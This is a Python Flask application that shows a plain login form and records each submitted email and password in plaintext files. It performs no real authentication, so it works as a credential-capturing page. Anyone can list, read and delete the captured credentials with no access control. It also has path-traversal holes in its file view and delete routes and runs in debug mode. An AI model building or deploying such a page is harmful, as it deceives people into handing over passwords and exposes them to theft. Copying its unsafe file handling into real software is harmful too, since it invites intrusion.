from flask import Flask, request, redirect, url_for, flash, render_template_string
import os
import secrets

app = Flask(__name__)

# Generate a random secret key for the Flask application
app.secret_key = secrets.token_hex(16)

# Directory to store responses
RESPONSES_DIR = 'responses'
os.makedirs(RESPONSES_DIR, exist_ok=True)

# HTML templates as strings
login_html = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
</head>
<body>
    <h1>Login</h1>
    <form method="post">
        <label for="user_email">Email:</label>
        <input type="email" id="user_email" name="user_email" required><br>
        <label for="user_pass">Password:</label>
        <input type="password" id="user_pass" name="user_pass" required><br>
        <button type="submit">Login</button>
    </form>
    <a href="{{ url_for('view_responses') }}">View Saved Responses</a>
</body>
</html>
'''

responses_html = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Saved Responses</title>
</head>
<body>
    <h1>Saved Responses</h1>
    <ul>
        {% for file in files %}
            <li>
                <a href="{{ url_for('view_response_file', filename=file) }}">{{ file }}</a>
                <a href="{{ url_for('delete_response_file', filename=file) }}">[Delete]</a>
            </li>
        {% endfor %}
    </ul>
    <a href="{{ url_for('login') }}">Back to Login</a>
</body>
</html>
'''

view_response_html = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Response Content</title>
</head>
<body>
    <h1>Response Content</h1>
    <pre>{{ content }}</pre>
    <a href="{{ url_for('view_responses') }}">Back to Responses</a>
</body>
</html>
'''

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        # Extract data from the form
        user_email = request.form.get('user_email')
        user_pass = request.form.get('user_pass')

        # Simulate a successful login and save the response
        response_content = f"Email: {user_email}, Password: {user_pass}\n"
        response_file = os.path.join(RESPONSES_DIR, f'response_{user_email}.html')
        with open(response_file, 'w') as file:
            file.write(response_content)

        flash('Login successful! Response saved.')
        return redirect(url_for('view_responses'))

    return render_template_string(login_html)

@app.route('/responses')
def view_responses():
    # List files in the responses directory
    response_files = os.listdir(RESPONSES_DIR)
    return render_template_string(responses_html, files=response_files)

@app.route('/responses/<filename>')
def view_response_file(filename):
    # Render the content of the selected file
    file_path = os.path.join(RESPONSES_DIR, filename)
    with open(file_path, 'r') as file:
        response_content = file.read()
    return render_template_string(view_response_html, content=response_content, filename=filename)

@app.route('/responses/delete/<filename>')
def delete_response_file(filename):
    # Delete the selected file
    file_path = os.path.join(RESPONSES_DIR, filename)
    if os.path.exists(file_path):
        os.remove(file_path)
        flash('Response deleted successfully.')
    else:
        flash('File not found.')
    return redirect(url_for('view_responses'))

if __name__ == '__main__':
    app.run(debug=True)
